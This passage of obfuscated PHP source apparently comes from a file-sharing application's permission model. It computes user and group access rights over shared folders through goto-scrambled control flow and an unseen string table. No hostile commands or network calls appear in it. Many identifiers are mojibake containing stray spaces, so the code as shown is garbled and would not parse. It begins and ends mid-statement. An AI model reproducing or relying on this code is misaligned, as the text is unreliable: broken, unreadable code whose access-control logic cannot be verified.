(!$eøåÚù×ã¼) { return array(); } $eôªšëÔùÀ = $EŸŠÍØŠ„¿[2273]; $Fäğº˜¥İÕ = array($EŸŠÍØŠ„¿[369] => array($EŸŠÍØŠ„¿[7], $eøåÚù×ã¼), $EŸŠÍØŠ„¿[397] => $EŸŠÍØŠ„¿[470]); goto c‚†Û…ó›; eÛÎ¾¶¤Í: } private function sourceListAuth($BË¹áè…·ƒ) { goto C­ĞŞÂ†°; eŒÅÛİ¥‡Å: return $aåÈ‘êîŠÕ; goto f£¾Ò”Î©ˆ; A ³çëÔ‹½: $e‡¢­à×ìİ = array(); foreach ($cÔŞ¨éÊ¢ as $a±°½ğî’›) { goto c‚«¾‰ğ; cÒÂØçùˆ: unset($a±°½ğî’›[$d´ñ·ßµ¶[391]]); $f“•ß˜æö© = $c¼Î“ğÚ™[$a±°½ğî’›[$d´ñ·ßµ¶[369]]]; if (!$f“•ß˜æö©) { continue; } goto BĞÉµ×ŸÖ³; BĞÉµ×ŸÖ³: $a±°½ğî’›[$d´ñ·ßµ¶[2274]] = $this->authTargetInfo($f“•ß˜æö©); $a±°½ğî’›[$d´ñ·ßµ¶[468]] = rtrim($a±°½ğî’›[$d´ñ·ßµ¶[464]], $d´ñ·ßµ¶[8]) . $d´ñ·ßµ¶[8] . ltrim($a±°½ğî’›[$d´ñ·ßµ¶[468]], $d´ñ·ßµ¶[8]); $aåÈ‘êîŠÕ[] = $a±°½ğî’›; goto dñëéˆ‹Á; c‚«¾‰ğ: unset($a±°½ğî’›[$d´ñ·ßµ¶[379]]); unset($a±°½ğî’›[$d´ñ·ßµ¶[378]]); unset($a±°½ğî’›[$d´ñ·ßµ¶[376]]); goto cÒÂØçùˆ; dñëéˆ‹Á: $BÒ¬×Ş›âÃ = count(explode($d´ñ·ßµ¶[8], trim($a±°½ğî’›[$d´ñ·ßµ¶[468]], $d´ñ·ßµ¶[8]))); $e‡¢­à×ìİ[] = $BÒ¬×Ş›âÃ + ($a±°½ğî’›[$d´ñ·ßµ¶[29]] == $d´ñ·ßµ¶[76] ? 0 : 1000); goto e¯ùœêè¬; e¯ùœêè¬: } array_multisort($e‡¢­à×ìİ, SORT_ASC, $aåÈ‘êîŠÕ); goto eŒÅÛİ¥‡Å; C­ĞŞÂ†°: $d´ñ·ßµ¶ =& $_SERVER[Å¸ş]; $cÔŞ¨éÊ¢ = Model($d´ñ·ßµ¶[1115])->sourceListInfo($BË¹áè…·ƒ, !0); $A´–ˆ¬ëéÎ = $d´ñ·ßµ¶[2270]; goto bÁºÍºÅË; bÁºÍºÅË: $aÒ“§ï¿çÉ = $this->field($A´–ˆ¬ëéÎ)->where(array($d´ñ·ßµ¶[369] => array($d´ñ·ßµ¶[7], $BË¹áè…·ƒ)))->select(); $c¼Î“ğÚ™ = array_to_keyvalue_group($aÒ“§ï¿çÉ, $d´ñ·ßµ¶[369]); $aåÈ‘êîŠÕ = array(); goto A ³çëÔ‹½; f£¾Ò”Î©ˆ: } private function groupChidldAllRootSource($F¾õ©œÙ†) { $fš„¥à²À =& $_SERVER[Å¸ş]; $c¼ÒòÖ•–° = Model($fš„¥à²À[2275])->groupChildrenAll($F¾õ©œÙ†); $fŠÈ‡‹‘Éò = array($fš„¥à²À[463] => 0, $fš„¥à²À[458] => array($fš„¥à²À[7], $c¼ÒòÖ•–°), $fš„¥à²À[371] => SourceModel::TYPE_GROUP); $bÏ›ôË¿¸ù = Model($fš„¥à²À[755])->field($fš„¥à²À[369])->where($fŠÈ‡‹‘Éò)->select(); $bÏ›ôË¿¸ù = array_to_keyvalue($bÏ›ôË¿¸ù, $fš„¥à²À[33], $fš„¥à²À[369]); return $bÏ›ôË¿¸ù; } private function authTargetInfo($EÀÀñÅ©Î‹) { goto eó†İŞóÍ³; d¤ß‘¤Ü±â: $cŒ† ‡‰¿Ö = 2 << 25; foreach ($EÀÀñÅ©Î‹ as $Dô’©ñÇ…) { goto A»˜ğˆë‹; E”•óÄ²Ç: if ($Dô’©ñÇ…[$B¢«ËÀˆó[371]] == SourceModel::TYPE_USER && $Dô’©ñÇ…[$B¢«ËÀˆó[458]] == $B¢«ËÀˆó[470]) { $Cª‹öˆæğÂ = 0; } $cêƒÚØñ–…[] = $eº‘Ğá‹œœ[$B¢«ËÀˆó[376]] + $Cª‹öˆæğÂ; goto fÔ×¬îÂÉ; Dñíà Œ·ø: if (!$b®äšÆ¦â„) { continue; } $b®äšÆ¦â„[$B¢«ËÀˆó[418]] = $eº‘Ğá‹œœ; $eô‹îÎ‚Ä[] = $b®äšÆ¦â„; goto a¬¹šÂ¬ÛØ; A»˜ğˆë‹: $eº‘Ğá‹œœ = Model($B¢«ËÀˆó[2271])->listData($Dô’©ñÇ…[$B¢«ËÀˆó[2252]]); if (!$eº‘Ğá‹œœ) { continue; } if ($Dô’©ñÇ…[$B¢«ËÀˆó[371]] == SourceModel::TYPE_USER) { $b®äšÆ¦â„ = Model($B¢«ËÀˆó[476])->getInfoSimpleOuter($Dô’©ñÇ…[$B¢«ËÀˆó[458]]); if ($b®äšÆ¦â„[$B¢«ËÀˆó[1436]] == $B¢«ËÀˆó[1029]) { continue; } if ($b®äšÆ¦â„[$B¢«ËÀˆó[1436]] == $B¢«ËÀˆó[470]) { $b®äšÆ¦â„[$B¢«ËÀˆó[28]] = LNG($B¢«ËÀˆó[2276]); } } else { $b®äšÆ¦â„ = Model($B¢«ËÀˆó[460])->getInfoSimple($Dô’©ñÇ…[$B¢«ËÀˆó[458]]); } goto Dñíà Œ·ø; a¬¹šÂ¬ÛØ: $Cª‹öˆæğÂ = 0; if ($Dô’©ñÇ…[$B¢«ËÀˆó[371]] == SourceModel::TYPE_GROUP) { $Cª‹öˆæğÂ = $cŒ† ‡‰¿Ö * 2; } if ($Dô’©ñÇ…[$B¢«ËÀˆó[371]] == SourceModel::TYPE_USER) { $Cª‹öˆæğÂ = $cŒ† ‡‰¿Ö; } goto E”•óÄ²Ç; fÔ×¬îÂÉ: } array_multisort($cêƒÚØñ–…, SORT_DESC, $eô‹îÎ‚Ä); goto F¯”‚Ûº‚Ó; eó†İŞóÍ³: $B¢«ËÀˆó =& $_SERVER[Å¸ş]; $eô‹îÎ‚Ä = array(); $cêƒÚØñ–… = array(); goto d¤ß‘¤Ü±â; F¯”‚Ûº‚Ó: return $eô‹îÎ‚Ä; goto EÓÇÎœëêÚ; EÓÇÎœëêÚ: } public function getAllChildrenByUser($FœÅÈÆŸä, $dğœ©µ»óô) { goto c­Á™°Ğ°†; CÑ¿‡ˆÍÄÁ: $BæÄÀÈá¥º = Model($f”Ø‹ÚŞã¸[1115])->sourceInfo($FœÅÈÆŸä); $E±âƒùø = array(); $aÏšÁ‰„åğ = 1; goto A¼³éíåë‚; A¼³éíåë‚: if ($BæÄÀÈá¥º[$f”Ø‹ÚŞã¸[463]] == $f”Ø‹ÚŞã¸[470] && $BæÄÀÈá¥º[$f”Ø‹ÚŞã¸[458]] != $aÏšÁ‰„åğ && $this->groupContainUser($BæÄÀÈá¥º[$f”Ø‹ÚŞã¸[458]], $dğœ©µ»óô)) { foreach ($Fğ··ò’İÁ[$f”Ø‹ÚŞã¸[2277]] as $c‚¹ÑğÒÁ˜) { $DŠ‹ñÁÉÏâ = Model($f”Ø‹ÚŞã¸[460])->getInfo($c‚¹ÑğÒÁ˜[$f”Ø‹ÚŞã¸[2108]]); $EÜòäœâÇ = Model($f”Ø‹ÚŞã¸[479])->getInfoSimpleOuter($dğœ©µ»óô); $EÜòäœâÇ[$f”Ø‹ÚŞã¸[418]] = $c‚¹ÑğÒÁ˜[$f”Ø‹ÚŞã¸[376]]; if (Model($f”Ø‹ÚŞã¸[2271])->authCheckAction($c‚¹ÑğÒÁ˜[$f”Ø‹ÚŞã¸[376]][$f”Ø‹ÚŞã¸[376]], $f”Ø‹ÚŞã¸[1562])) { continue; } $fÙ—²Á£¢² = array($f”Ø‹ÚŞã¸[28] => $f”Ø‹ÚŞã¸[1389] . $DŠ‹ñÁÉÏâ[$f”Ø‹ÚŞã¸[28]], $f”Ø‹ÚŞã¸[369] => $DŠ‹ñÁÉÏâ[$f”Ø‹ÚŞã¸[391]][$f”Ø‹ÚŞã¸[369]], $f”Ø‹ÚŞã¸[75] => KodIO::make($DŠ‹ñÁÉÏâ[$f”Ø‹ÚŞã¸[391]][$f”Ø‹ÚŞã¸[369]]), $f”Ø‹ÚŞã¸[463] => $f”Ø‹ÚŞã¸[470], $f”Ø‹ÚŞã¸[371] => $f”Ø‹ÚŞã¸[968], $f”Ø‹ÚŞã¸[29] => $f”Ø‹ÚŞã¸[490], $f”Ø‹ÚŞã¸[468] => $DŠ‹ñÁÉÏâ[$f”Ø‹ÚŞã¸[465]], $f”Ø‹ÚŞã¸[2108] => $DŠ‹ñÁÉÏâ[$f”Ø‹ÚŞã¸[2108]], $f”Ø‹ÚŞã¸[462] => $DŠ‹ñÁÉÏâ[$f”Ø‹ÚŞã¸[463]], $f”Ø‹ÚŞã¸[2274] => array($EÜòäœâÇ)); $E±âƒùø[$fÙ—²Á£¢²[$f”Ø‹ÚŞã¸[369]]] = $fÙ—²Á£¢²; } } $Då½Îí§¨ = array(); $e»‚ÍğÁ— = $this->getAllChildren($FœÅÈÆŸä); goto F”à¾Ÿ½; fŠš¬ìé¢: return $Då½Îí§¨; goto CÅŞ´‹Øì; F”à¾Ÿ½: foreach ($e»‚ÍğÁ— as $E—İùƒô–¥) { $dä…·£í¢Å = !1; foreach ($E—İùƒô–¥[$f”Ø‹ÚŞã¸[2274]] as $BéŠÙ†Œ¾À) { if ($BéŠÙ†Œ¾À[$f”Ø‹ÚŞã¸[1436]]) { if ($BéŠÙ†Œ¾À[$f”Ø‹ÚŞã¸[1436]] == $dğœ©µ»óô) { $dä…·£í¢Å = !0; break; } } if ($BéŠÙ†Œ¾À[$f”Ø‹ÚŞã¸[2108]]) { if ($this->groupContainUser($BéŠÙ†Œ¾À[$f”Ø‹ÚŞã¸[2108]], $dğœ©µ»óô)) { $dä…·£í¢Å = !0; break; } } } if ($dä…·£í¢Å) { $Då½Îí§¨[] = $E—İùƒô–¥; } $b…ÚÓ“Ö„· = $E—İùƒô–¥[$f”Ø‹ÚŞã¸[369]]; if (isset($E±âƒùø[$b…ÚÓ“Ö„·])) { $E—İùƒô–¥[$f”Ø‹ÚŞã¸[2274]][] = $E±âƒùø[$b…ÚÓ“Ö„·][0]; $E±âƒùø[$b…ÚÓ“Ö„·] = !1; } } $E±âƒùø = array_filter(array_values($E±âƒùø)); $Då½Îí§¨ = array_merge($E±âƒùø, $Då½Îí§¨); goto fŠš¬ìé¢; c­Á™°Ğ°†: $f”Ø‹ÚŞã¸ =& $_SERVER[Å¸ş]; $Fğ··ò’İÁ = Model($f”Ø‹ÚŞã¸[479])->getInfo($dğœ©µ»óô); if (!$dğœ©µ»óô || !$FœÅÈÆŸä || !$Fğ··ò’İÁ) { return array(); } goto CÑ¿‡ˆÍÄÁ; CÅŞ´‹Øì: } public function setAllChildrenByUser($dÎÌ·‚¨¿, $c³½‹…¾Î, $fùŠ”è´ÎØ) { $dÃ ù°êá =& $_SERVER[Å¸ş]; $b¹ß¶åñƒ‚ = $this->getAllChildrenByUser($dÎÌ·‚¨¿, $c³½‹…¾Î); if (!$fùŠ”è´ÎØ || !$b¹ß¶åñƒ‚) { return !1; } foreach ($b¹ß¶åñƒ‚ as $Döì÷‰íè½) { $Câ¾”·½  = array(); foreach ($Döì÷‰íè½[$dÃ ù°êá[2274]] as $Cè°éÀì£¡) { $fùŸóÍ……™ = $Cè°éÀì£¡[$dÃ ù°êá[418]]; $bæäÌ›İŞ• = $Cè°éÀì£¡[$dÃ ù°êá[1436]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $aññâÈÇÍ½ = $Cè°éÀì£¡[$dÃ ù°êá[1436]] ? $Cè°éÀì£¡[$dÃ ù°êá[1436]] : $Cè°éÀì£¡[$dÃ ù°êá[2108]]; if ($Cè°éÀì£¡[$dÃ ù°êá[1436]] && $Cè°éÀì£¡[$dÃ ù°êá[1436]] == $c³½‹…¾Î) { continue; } $Câ¾”·½ [] = array($dÃ ù°êá[369] => $Döì÷‰íè½[$dÃ ù°êá[369]], $dÃ ù°êá[371] => $bæäÌ›İŞ•, $dÃ ù°êá[458] => intval($aññâÈÇÍ½), $dÃ ù°êá[2252] => isset($fùŸóÍ……™[$dÃ ù°êá[367]]) ? intval($fùŸóÍ……™[$dÃ ù°êá[367]]) : 0, $dÃ ù°êá[2253] => isset($fùŸóÍ……™[$dÃ ù°êá[2253]]) ? intval($fùŸóÍ……™[$dÃ ù°êá[2253]]) : -1); } $Câ¾”·½ [] = array($dÃ ù°êá[369] => $Döì÷‰íè½[$dÃ ù°êá[369]], $dÃ ù°êá[371] => SourceModel::TYPE_USER, $dÃ ù°êá[458] => intval($c³½‹…¾Î), $dÃ ù°êá[2252] => intval($fùŠ”è´ÎØ), $dÃ ù°êá[2253] => -1); $this->where(array($dÃ ù°êá[383] => $Döì÷‰íè½[$dÃ ù°êá[369]]))->delete(); $this->addAll($Câ¾”·½ ); } return !0; } public function get($AİîŠÆÛ¾ë) { $d®§õ…¾ïó = $this->getSourceList(array($AİîŠÆÛ¾ë), !0); return $d®§õ…¾ïó[0]; } public function getSourceList($Fº¦Åóí•Ò, $fµÀå°Ÿª¨ = false, $dã“¡Ÿ·¾• = false) { goto cÂİ‡«à³í; F­íªè¿¤: $c…š×Ú¨ƒ = $this->userIsRoot($dã“¡Ÿ·¾•); $D—¬ª¦ĞÒó = AuthModel::authAll(); $fÃËÛÑŠ” = array($B¤¦®î‡ëØ[377] => $D—¬ª¦ĞÒó, $B¤¦®î‡ëØ[2280] => array($B¤¦®î‡ëØ[385] => 0, $B¤¦®î‡ëØ[2114] => $D—¬ª¦ĞÒó, $B¤¦®î‡ëØ[386] => LNG($B¤¦®î‡ëØ[2281]), $B¤¦®î‡ëØ[2127] => $B¤¦®î‡ëØ[2282])); goto d²èµÂ¤–Ù; a–°øÏ§–Š: $bÇØ†•é = array_to_keyvalue_group($bÇØ†•é, $B¤¦®î‡ëØ[369]); $bÌæä„‹ˆÁ = array(); foreach ($bØÙ¿¤¹Í‘ as $dÖÂö¿¿¡) { if (isset($bÇØ†•é[$dÖÂö¿¿¡])) { $bÌæä„‹ˆÁ[$dÖÂö¿¿¡] = $bÇØ†•é[$dÖÂö¿¿¡]; } } goto F­íªè¿¤; dÆ°½À¿¦Û: if (!$fµÀå°Ÿª¨ && count($Fº¦Åóí•Ò) == 1) { $fµÀå°Ÿª¨ = array(); $fµÀå°Ÿª¨[$Fº¦Åóí•Ò[0]] = $Dã’í­Ù´->sourceInfo($Fº¦Åóí•Ò[0]); } if (!$fµÀå°Ÿª¨) { $cø•­ËáòÈ = array($B¤¦®î‡ëØ[383] => array($B¤¦®î‡ëØ[384], $Fº¦Åóí•Ò)); $fµÀå°Ÿª¨ = $Dã’í­Ù´->field($B¤¦®î‡ëØ[2278])->where($cø•­ËáòÈ)->select(); $fµÀå°Ÿª¨ = array_to_keyvalue($fµÀå°Ÿª¨, $B¤¦®î‡ëØ[369]); } $bØÙ¿¤¹Í‘ = $Fº¦Åóí•Ò; goto bÂ…»‚çÃÔ; bÂ…»‚çÃÔ: foreach ($fµÀå°Ÿª¨ as $dªİÁáø˜Ã => $aÏ«›÷Çõß) { $DÙğ×±«‹ = $Dã’í­Ù´->parentLevelArray($aÏ«›÷Çõß[$B¤¦®î‡ëØ[461]]); $bØÙ¿¤¹Í‘ = array_merge($bØÙ¿¤¹Í‘, array($dªİÁáø˜Ã), array_reverse($DÙğ×±«‹)); } $bØÙ¿¤¹Í‘ = array_values(array_unique($bØÙ¿¤¹Í‘)); if (!$bØÙ¿¤¹Í‘) { return array(); } goto D†é²†ë¹ï; D†é²†ë¹ï: $Fº–áî¬šç = $B¤¦®î‡ëØ[2279]; $cø•­ËáòÈ = array($B¤¦®î‡ëØ[383] => array($B¤¦®î‡ëØ[384], $bØÙ¿¤¹Í‘)); $bÇØ†•é = $this->field($Fº–áî¬šç)->where($cø•­ËáòÈ)->select(); goto a–°øÏ§–Š; d²èµÂ¤–Ù: $DƒŸ­İ¸³ì = array(); foreach ($fµÀå°Ÿª¨ as $dÖÂö¿¿¡ => $Fë™‚® ) { if ($c…š×Ú¨ƒ) { $DƒŸ­İ¸³ì[$dÖÂö¿¿¡] = $fÃËÛÑŠ”; continue; } $DƒŸ­İ¸³ì[$dÖÂö¿¿¡] = $this->makeSourceAuth($Fë™‚® , $bÌæä„‹ˆÁ, $dã“¡Ÿ·¾•); } return $DƒŸ­İ¸³ì; goto DğƒÜ»Å§©; cÂİ‡«à³í: $B¤¦®î‡ëØ =& $_SERVER[Å¸ş]; if (!$Fº¦Åóí•Ò) { return array(); } $Dã’í­Ù´ = Model($B¤¦®î‡ëØ[1115]); goto dÆ°½À¿¦Û; DğƒÜ»Å§©: } public function authDeepCheck($AŒ£“–Úğ‹, $DÖ£Ö›æáì = false) { goto f×µç„Íõ‰; dí¤÷–˜Ì: $dÇ™óïÃÁ = $dÈ†‘éä± ? $dÈ†‘éä±[0] : $AŒ£“–Úğ‹; return array($F¡È»Û¹ˆ“[377] => -1, $F¡È»Û¹ˆ“[418] => array($F¡È»Û¹ˆ“[385] => $F¡È»Û¹ˆ“[1029], $F¡È»Û¹ˆ“[2114] => $F¡È»Û¹ˆ“[470], $F¡È»Û¹ˆ“[386] => LNG($F¡È»Û¹ˆ“[2285]), $F¡È»Û¹ˆ“[2127] => $F¡È»Û¹ˆ“[2286]), $F¡È»Û¹ˆ“[2287] => LNG($F¡È»Û¹ˆ“[2288]), $F¡È»Û¹ˆ“[2289] => $this->sourceAuthInfo($dÇ™óïÃÁ)); goto b•¨êãŞ‰¹; eÃô†¬ê°ã: if (!in_array($AŒ£“–Úğ‹, $e”ùÖæò¸[$F¡È»Û¹ˆ“[2283]])) { return !1; } $dÈ†‘éä± = array(); foreach ($e”ùÖæò¸[$F¡È»Û¹ˆ“[2284]] as $d·Ì«©š => $f†Å°†çÚ) { if (!in_array($AŒ£“–Úğ‹, $f†Å°†çÚ)) { continue; } $dÈ†‘éä±[] = $d·Ì«©š; } goto dí¤÷–˜Ì; f×µç„Íõ‰: $F¡È»Û¹ˆ“ =& $_SERVER[Å¸ş]; $DÖ£Ö›æáì = $DÖ£Ö›æáì ? $DÖ£Ö›æáì : USER_ID; $e”ùÖæò¸ = $this->makeAuthDeep($DÖ£Ö›æáì); goto eÃô†¬ê°ã; b•¨êãŞ‰¹: } protected function makeAuthDeep($D÷‰ê‹‰¡ˆ = false) { goto EÚîÆùÀÜ; EÚîÆùÀÜ: $BˆÚ©ê«çá =& $_SERVER[Å¸ş]; static $EÊ É¶ºíË = array(); $D÷‰ê‹‰¡ˆ = $D÷‰ê‹‰¡ˆ ? $D÷‰ê‹‰¡ˆ : USER_ID; goto dÌÃˆÀæ‚Ğ; bå—§´ôÄ: $cáÜ´·á×¸ = array(); $Cª‘ŞÒìÑé = array(); $BÄ›¼ÕøÛ± = array(); goto f¼±Æññ³Å; fÖÀ®´’Ì†: foreach ($a“®•Âé¤ as $FöÖ¼‹ùé) { if ($FöÖ¼‹ùé[$BˆÚ©ê«çá[376]] == 0 && $FöÖ¼‹ùé[$BˆÚ©ê«çá[2129]] == $BˆÚ©ê«çá[83]) { $B“øçâ¿Å‘[] = $FöÖ¼‹ùé[$BˆÚ©ê«çá[367]]; } } $cÙ¦×õâß‘ = $this->userGroupParents($D÷‰ê‹‰¡ˆ); $aÍª ËŠ›¦ = array($BˆÚ©ê«çá[371] => SourceModel::TYPE_USER, $BˆÚ©ê«çá[458] => $D÷‰ê‹‰¡ˆ); goto EŸô·¾ Øï; côãÈ³µ‘: $e„‹§¦ñÓ† = array_to_keyvalue($a¬Ì¡‰¼Îé, $BˆÚ©ê«çá[33], $BˆÚ©ê«çá[369]); $BÆÖÖÒ®´Ó = array(); $EÑùƒÅÛ‰ = $cÙ¦×õâß‘; goto aŒ×„ÕÅíï; EŸô·¾ Øï: if ($cÙ¦×õâß‘) { $aÍª ËŠ›¦ = array(array($BˆÚ©ê«çá[371] => SourceModel::TYPE_USER, $BˆÚ©ê«çá[458] => $D÷‰ê‹‰¡ˆ), array($BˆÚ©ê«çá[371] => SourceModel::TYPE_GROUP, $BˆÚ©ê«çá[458] => array($BˆÚ©ê«çá[384], $cÙ¦×õâß‘)), $BˆÚ©ê«çá[911] => $BˆÚ©ê«çá[2193]); } if ($B“øçâ¿Å‘) { $aÍª ËŠ›¦ = array($aÍª ËŠ›¦, $BˆÚ©ê«çá[2252] => array($BˆÚ©ê«çá[2291], $B“øçâ¿Å‘)); } $a¬Ì¡‰¼Îé = $this->field($BˆÚ©ê«çá[2292])->where($aÍª ËŠ›¦)->select(); goto côãÈ³µ‘; aŒ×„ÕÅíï: $EÍ¼íæÔ³š = Model($BˆÚ©ê«çá[1115]); $bˆÏ¬ÛÀÆî = Model($BˆÚ©ê«çá[460]); $föñÆÎÏ = array(); goto bå—§´ôÄ; b®êĞÓ©·: foreach ($CÊå®ùôÁ as $DÂÓ‡¤ í‡) { $E”­¯ô«¬Ë = $bˆÏ¬ÛÀÆî->getInfo($DÂÓ‡¤ í‡); $AÂ¸—±ƒ†› = $EÍ¼íæÔ³š->parentLevelArray($E”­¯ô«¬Ë[$BˆÚ©ê«çá[461]]); $EÑùƒÅÛ‰ = array_merge($EÑùƒÅÛ‰, $AÂ¸—±ƒ†›); } $EÑùƒÅÛ‰ = array_values(array_unique($EÑùƒÅÛ‰)); foreach ($EÑùƒÅÛ‰ as $DÂÓ‡¤ í‡) { $E”­¯ô«¬Ë = $bˆÏ¬ÛÀÆî->getInfo($DÂÓ‡¤ í‡); $BÆÖÖÒ®´Ó[] = $E”­¯ô«¬Ë[$BˆÚ©ê«çá[391]][$BˆÚ©ê«çá[369]]; $Cª‘ŞÒìÑé[$DÂÓ‡¤ í‡] = $E”­¯ô«¬Ë[$BˆÚ©ê«çá[391]][$BˆÚ©ê«çá[369]]; $BÄ›¼ÕøÛ±[$DÂÓ‡¤ í‡] = $EÍ¼íæÔ³š->parentLevelArray($E”­¯ô«¬Ë[$BˆÚ©ê«çá[461]]); } goto FÜ“ªµ¹¬; f¼±Æññ³Å: if ($e„‹§¦ñÓ†) { $e‡—ŞØ‡Ç‘ = $EÍ¼íæÔ³š->where(array($BˆÚ©ê«çá[369] => array($BˆÚ©ê«çá[384], $e„‹§¦ñÓ†)))->select(); foreach ($e‡—ŞØ‡Ç‘ as $fË£ö™‰Úø) { $AÂ¸—±ƒ†› = $EÍ¼íæÔ³š->parentLevelArray($fË£ö™‰Úø[$BˆÚ©ê«çá[461]]); $BÆÖÖÒ®´Ó = array_merge($BÆÖÖÒ®´Ó, $AÂ¸—±ƒ†›); $EÑùƒÅÛ‰[] = $fË£ö™‰Úø[$BˆÚ©ê«çá[458]]; $föñÆÎÏ[$fË£ö™‰Úø[$BˆÚ©ê«çá[369]]] = $AÂ¸—±ƒ†›; $cáÜ´·á×¸[$fË£ö™‰Úø[$BˆÚ©ê«çá[369]]] = $fË£ö™‰Úø[$BˆÚ©ê«çá[458]]; } } $EÑùƒÅÛ‰ = array_values(array_unique($EÑùƒÅÛ‰)); $CÊå®ùôÁ = $EÑùƒÅÛ‰; goto b®êĞÓ©·; FÅ©ïÃÔÕó: $EÊ É¶ºíË[$D÷‰ê‹‰¡ˆ] = $AÛ¹Óï¿ğ¡; return $AÛ¹Óï¿ğ¡; goto cÙ¡ÏËëÇÌ; dÌÃˆÀæ‚Ğ: if (isset($EÊ É¶ºíË[$D÷‰ê‹‰¡ˆ])) { return $EÊ É¶ºíË[$D÷‰ê‹‰¡ˆ]; } $a“®•Âé¤ = Model($BˆÚ©ê«çá[2290])->listData(); $B“øçâ¿Å‘ = array(); goto fÖÀ®´’Ì†; FÜ“ªµ¹¬: foreach ($föñÆÎÏ as $bÅ®‰ã·ÓÕ => $Eßç¤ƒö©†) { $dïó–„šô” = $cáÜ´·á×¸[$bÅ®‰ã·ÓÕ]; if (!$dïó–„šô” || !$Cª‘ŞÒìÑé[$dïó–„šô”]) { continue; } $Dšµ…Ï…¶´ = array(); foreach ($BÄ›¼ÕøÛ±[$dïó–„šô”] as $DÂÓ‡¤ í‡) { $Dšµ…Ï…¶´[] = $Cª‘ŞÒìÑé[$DÂÓ‡¤ í‡]; } $föñÆÎÏ[$bÅ®‰ã·ÓÕ] = array_merge($Dšµ…Ï…¶´, $Eßç¤ƒö©†); } $BÆÖÖÒ®´Ó = array_values(array_unique($BÆÖÖÒ®´Ó)); $AÛ¹Óï¿ğ¡ = array($BˆÚ©ê«çá[2283] => $BÆÖÖÒ®´Ó, $BˆÚ©ê«çá[2284] => $föñÆÎÏ); goto FÅ©ïÃÔÕó; cÙ¡ÏËëÇÌ: } private function makeSourceAuth($Aå²¸ŒÆ›Î, $CË¹ÊøÒ£…, $b©”ïÁâÏ = false) { goto BîäÜ‰¦Ò·; A“å•á­ö: $CÙÆóĞÔó¸ = $Aå²¸ŒÆ›Î[$E¯†”¨À½á[371]] == SourceModel::TYPE_GROUP; $BÒ¶“°Ô = $CÙÆóĞÔó¸ ? $this->groupRootAuth($E»ŒØè×ÙÏ, $b©”ïÁâÏ) : !1; if ($BÒ¶“°Ô && Model($E¯†”¨À½á[2271])->authCheckAction($BÒ¶“°Ô[$E¯†”¨À½á[376]], $E¯†”¨À½á[1562])) { return $this->groupAuthInfo($BÒ¶“°Ô, $E»ŒØè×ÙÏ); } goto B±§ÎŠÄŸá; B±§ÎŠÄŸá: $dÎ‘àË¶§Í = Model($E¯†”¨À½á[1115])->parentLevelArray($Aå²¸ŒÆ›Î[$E¯†”¨À½á[461]]); $dÎ‘àË¶§Í = array_merge(array($Aå²¸ŒÆ›Î[$E¯†”¨À½á[369]]), array_reverse($dÎ‘àË¶§Í)); $B‡êìùíøç = !1; goto FŒá¨Œ–Îí; A÷®±¦Ÿ‚: if (!$B‡êìùíøç) { $bœ¸”óƒ‰“ = Model($E¯†”¨À½á[460])->getInfo($E»ŒØè×ÙÏ); $d ¯é¢Š = explode($E¯†”¨À½á[47], trim($bœ¸”óƒ‰“[$E¯†”¨À½á[461]], $E¯†”¨À½á[47])); foreach ($d ¯é¢Š as $c‰Û¥òĞŒ) { if ($c‰Û¥òĞŒ == $E¯†”¨À½á[470] || $c‰Û¥òĞŒ == $C—‰¯Ô˜‹) { continue; } $a£¨Ñôˆà = $this->groupRootAuth($c‰Û¥òĞŒ, $b©”ïÁâÏ); if (!$a£¨Ñôˆà) { continue; } $B‡êìùíøç = $this->groupAuthInfo($a£¨Ñôˆà, $c‰Û¥òĞŒ); break; } } if (!$B‡êìùíøç || $B‡êìùíøç[$E¯†”¨À½á[377]] <= 0) { $f­±ĞäíŞ¯ = $this->authDeepCheck($Aå²¸ŒÆ›Î[$E¯†”¨À½á[369]], $b©”ïÁâÏ); if ($f­±ĞäíŞ¯) { $B‡êìùíøç = $f­±ĞäíŞ¯; } } return $B‡êìùíøç; goto b„ñÉÛ¥—; BîäÜ‰¦Ò·: $E¯†”¨À½á =& $_SERVER[Å¸ş]; $C—‰¯Ô˜‹ = $E¯†”¨À½á[83]; $E»ŒØè×ÙÏ = $Aå²¸ŒÆ›Î[$E¯†”¨À½á[458]]; goto A“å•á­ö; FŒá¨Œ–Îí: foreach ($dÎ‘àË¶§Í as $A†Ê†™³) { if (!isset($CË¹ÊøÒ£…[$A†Ê†™³])) { continue; } $C°×È°Û„ = $this->authMake($CË¹ÊøÒ£…[$A†Ê†™³], $b©”ïÁâÏ); if ($C°×È°Û„[$E¯†”¨À½á[418]]) { $B‡êìùíøç = $C°×È°Û„; break; } } if (!$CÙÆóĞÔó¸) { return $B‡êìùíøç; } if (!$B‡êìùíøç && $BÒ¶“°Ô) { $B‡êìùíøç = $this->groupAuthInfo($BÒ¶“°Ô, $E»ŒØè×ÙÏ); } goto A÷®±¦Ÿ‚; b„ñÉÛ¥—: } private function userIsRoot($cÀ“¶ª¡ä = false) { $dËŠ¤Â‰Ë =& $_SERVER[Å¸ş]; if (!$cÀ“¶ª¡ä && _get($GLOBALS, $dËŠ¤Â‰Ë[459])) { return !0; } $a„ª×ø¸¥ƒ = Model($dËŠ¤Â‰Ë[479])->getInfo($cÀ“¶ª¡ä); $fßÈ¶²òîõ = Model($dËŠ¤Â‰Ë[2293])->listData($a„ª×ø¸¥ƒ[$dËŠ¤Â‰Ë[1319]]); if ($fßÈ¶²òîõ && $fßÈ¶²òîõ[$dËŠ¤Â‰Ë[1190]][$dËŠ¤Â‰Ë[2294]] == 1) { return !0; } return !1; } private function sourceAuthInfo($eá­åˆ…ò‹) { goto a¼çµ’ÆÖ’; aÖ„ˆÁÜ¨: if (!$AÍ¸òä–İä) { return !1; } $b¡ˆ¼ÎİÜƒ->groupPathDisplay($AÍ¸òä–İä); $DÑÕåœˆê¼ = array($AÍ¸òä–İä); goto Fš†‚‹°¤; Fš†‚‹°¤: $DÑÕåœˆê¼ = $b¡ˆ¼ÎİÜƒ->_listAppendPath($DÑÕåœˆê¼); $AÍ¸òä–İä = $DÑÕåœˆê¼[0]; $c¦Ï›‘İ© = $AÍ¸òä–İä[$B´¹­Ò‘Ã[468]]; goto E“·ŠÔÜ‰; E“·ŠÔÜ‰: if (isset($AÍ¸òä–İä[$B´¹­Ò‘Ã[466]])) { $B›îÂ´†·ò = explode($B´¹­Ò‘Ã[8], trim($AÍ¸òä–İä[$B´¹­Ò‘Ã[468]], $B´¹­Ò‘Ã[8])); array_shift($B›îÂ´†·ò); $c¦Ï›‘İ© = $AÍ¸òä–İä[$B´¹­Ò‘Ã[464]] . $B´¹­Ò‘Ã[2295] . 